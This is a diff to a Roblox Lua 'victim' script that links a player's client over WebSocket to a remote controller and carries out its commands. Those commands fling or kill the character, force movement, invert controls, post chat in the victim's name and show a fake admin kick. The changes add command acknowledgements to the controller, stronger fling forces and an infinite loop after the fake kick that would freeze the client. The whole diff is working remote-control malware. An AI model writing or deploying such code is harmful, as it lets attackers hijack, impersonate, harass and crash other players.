@@ -15,6 +15,9 @@ local WS_Connect = (WebSocket and WebSocket.connect)
     or (getgenv and getgenv().websocket and getgenv().websocket.connect)
 if not WS_Connect then return end
 
+local mySessionId = tostring(tick()) .. "_" .. tostring(math.random(1000, 9999))
+_G.SacredVictimSessionId = mySessionId
+
 if _G.SacredVictimWS then
     pcall(function() _G.SacredVictimWS:Close() end)
     _G.SacredVictimWS = nil
@@ -36,31 +39,55 @@ local function getGui()
     return game:GetService("CoreGui")
 end
 
-local function handleCommand(data)
+local function getCharacter()
+    local c = LocalPlayer.Character
+    if c and c:FindFirstChild("HumanoidRootPart") then
+        return c, c:FindFirstChild("HumanoidRootPart"), c:FindFirstChildOfClass("Humanoid")
+    end
+    local wc = workspace:FindFirstChild(LocalPlayer.Name)
+    if wc and wc:FindFirstChild("HumanoidRootPart") then
+        return wc, wc:FindFirstChild("HumanoidRootPart"), wc:FindFirstChildOfClass("Humanoid")
+    end
+    if c then
+        local r = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
+        local h = c:FindFirstChildOfClass("Humanoid")
+        return c, r, h
+    end
+    return nil, nil, nil
+end
+
+local function handleCommand(data, ws)
     if data.target and data.target ~= "TODOS" then
-        local targetName = string.lower(tostring(data.target))
-        local myName = string.lower(tostring(LocalPlayer.Name or ""))
-        local myDisplay = string.lower(tostring(LocalPlayer.DisplayName or ""))
-        if targetName ~= myName and targetName ~= myDisplay then
+        local t = string.lower(string.gsub(tostring(data.target), "%s+", ""))
+        local myN = string.lower(string.gsub(tostring(LocalPlayer.Name or ""), "%s+", ""))
+        local myD = string.lower(string.gsub(tostring(LocalPlayer.DisplayName or ""), "%s+", ""))
+        if t ~= myN and t ~= myD and not string.find(myN, t, 1, true) and not string.find(t, myN, 1, true) then
             return
         end
     end
 
-    local char = LocalPlayer.Character
-    local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"))
-    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    pcall(function()
+        ws:Send(HttpService:JSONEncode({
+            type = "cmd_ack",
+            action = tostring(data.action),
+            username = tostring(LocalPlayer.Name),
+            status = "ejecutado"
+        }))
+    end)
+
+    local char, root, hum = getCharacter()
     local cam = workspace.CurrentCamera
 
     if data.action == "fling" and root then
         pcall(function()
-            if hum then hum.Sit = true end
+            if hum then hum.Sit = true hum.PlatformStand = true end
             local bv = Instance.new("BodyVelocity")
             bv.Name = "SacredFling"
-            bv.Velocity = Vector3.new(math.random(-500, 500), 5000, math.random(-500, 500))
+            bv.Velocity = Vector3.new(math.random(-500, 500), 8000, math.random(-500, 500))
             bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
             bv.Parent = root
-            Debris:AddItem(bv, 1)
-            root.AssemblyLinearVelocity = Vector3.new(0, 5000, 0)
+            Debris:AddItem(bv, 1.5)
+            root.AssemblyLinearVelocity = Vector3.new(0, 8000, 0)
             root.RotVelocity = Vector3.new(10000, 10000, 10000)
         end)
 
@@ -71,13 +98,13 @@ local function handleCommand(data)
             exp.BlastPressure = 5000000
             exp.BlastRadius = 30
             exp.Parent = workspace
-            if hum then hum.Sit = true end
+            if hum then hum.Sit = true hum.PlatformStand = true end
             local bv = Instance.new("BodyVelocity")
             bv.Name = "SacredExplode"
-            bv.Velocity = Vector3.new(math.random(-1500, 1500), 4000, math.random(-1500, 1500))
+            bv.Velocity = Vector3.new(math.random(-1500, 1500), 5000, math.random(-1500, 1500))
             bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
             bv.Parent = root
-            Debris:AddItem(bv, 0.8)
+            Debris:AddItem(bv, 1)
             root.RotVelocity = Vector3.new(6000, 6000, 6000)
         end)
 
@@ -85,11 +112,18 @@ local function handleCommand(data)
         pcall(function()
             LocalPlayer:Kick("Has sido expulsado del servidor por un Administrador. (Error Code: 267)")
         end)
+        task.delay(0.6, function()
+            pcall(function()
+                while true do
+                    Instance.new("Message", workspace).Text = "KICKED"
+                end
+            end)
+        end)
 
     elseif data.action == "reset_character" then
         pcall(function()
-            if hum then hum.Health = 0 end
-            if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
+            if char then char:BreakJoints() end
+            if hum then hum.Health = 0 hum:ChangeState(Enum.HumanoidStateType.Dead) end
             if root then root.CFrame = CFrame.new(0, -99999, 0) end
         end)
 
@@ -103,8 +137,7 @@ local function handleCommand(data)
         if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
         hum.WalkSpeed = 250
         speedLoop = RunService.RenderStepped:Connect(function()
-            local c = LocalPlayer.Character
-            local h = c and c:FindFirstChildOfClass("Humanoid")
+            local _, _, h = getCharacter()
             if h then h.WalkSpeed = 250 end
         end)
 
@@ -112,8 +145,7 @@ local function handleCommand(data)
         if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
         hum.WalkSpeed = 3
         speedLoop = RunService.RenderStepped:Connect(function()
-            local c = LocalPlayer.Character
-            local h = c and c:FindFirstChildOfClass("Humanoid")
+            local _, _, h = getCharacter()
             if h then h.WalkSpeed = 3 end
         end)
 
@@ -126,8 +158,7 @@ local function handleCommand(data)
         if spinLoop then pcall(function() spinLoop:Disconnect() end) spinLoop = nil end
         spinLoop = RunService.RenderStepped:Connect(function()
             if not isSpinning then return end
-            local c = LocalPlayer.Character
-            local r = c and c:FindFirstChild("HumanoidRootPart")
+            local _, r, _ = getCharacter()
             if r then
                 r.CFrame = r.CFrame * CFrame.Angles(0, math.rad(25), 0)
             end
@@ -176,7 +207,12 @@ local function handleCommand(data)
     elseif data.action == "chat" and data.message then
         pcall(function()
             if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-                TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(data.message))
+                local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:FindFirstChild("RBXSystem")
+                if channel then
+                    channel:SendAsync(tostring(data.message))
+                else
+                    TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(tostring(data.message))
+                end
             else
                 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(data.message), "All")
             end
@@ -285,8 +321,7 @@ local function handleCommand(data)
             RunService:UnbindFromRenderStep("SacredInvert")
             RunService:BindToRenderStep("SacredInvert", Enum.RenderPriority.Character.Value + 1, function()
                 if not controlsInverted then return end
-                local c = LocalPlayer.Character
-                local h = c and c:FindFirstChildOfClass("Humanoid")
+                local _, _, h = getCharacter()
                 if h and h.MoveDirection.Magnitude > 0.05 then
                     h:Move(-h.MoveDirection, false)
                 end
@@ -319,7 +354,7 @@ local function handleCommand(data)
 end
 
 task.spawn(function()
-    while true do
+    while _G.SacredVictimSessionId == mySessionId do
         local ok, ws = pcall(function() return WS_Connect(WS_URL) end)
         if ok and ws then
             _G.SacredVictimWS = ws
@@ -347,7 +382,7 @@ task.spawn(function()
                         sendPresence("victim_joined")
                     elseif data.type == "master_command" then
                         task.spawn(function()
-                            handleCommand(data)
+                            handleCommand(data, ws)
                         end)
                     end
                 end
@@ -362,11 +397,12 @@ task.spawn(function()
                 end)
             end)
 
-            while not isClosed and _G.SacredVictimWS == ws do
+            while not isClosed and _G.SacredVictimWS == ws and _G.SacredVictimSessionId == mySessionId do
                 task.wait(10)
                 sendPresence("victim_ping")
             end
         end
+        if _G.SacredVictimSessionId ~= mySessionId then break end
         task.wait(3)
     end
 end)
